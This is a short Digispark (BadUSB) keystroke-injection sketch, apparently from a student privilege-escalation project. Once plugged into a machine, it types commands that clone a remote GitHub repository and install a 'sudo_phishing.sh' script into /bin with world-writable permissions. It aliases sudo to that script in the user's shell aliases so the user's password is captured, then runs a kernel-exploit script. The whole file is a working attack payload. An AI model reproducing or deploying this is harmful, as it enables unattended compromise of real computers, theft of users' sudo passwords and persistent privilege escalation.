#include "DigiKeyboard.h"
void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);

    DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(4000);

    DigiKeyboard.print("cd Final-Project-Priv-Escalation/fake-sudo && chmod +x sudo_phishing.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    DigiKeyboard.print("cp sudo_phishing.sh /bin/sudo_phishing.sh && chmod 777 /bin/sudo_phishing.sh && echo \"alias sudo='/bin/sudo_phishing.sh'\" >> ~/.bash_aliases && source ~/.bash_aliases && . ~/.bash_aliases");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    DigiKeyboard.print("cd ../Final-Project-Priv-Escalation/kernel-exploits && python main.py");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
}

void loop() {
}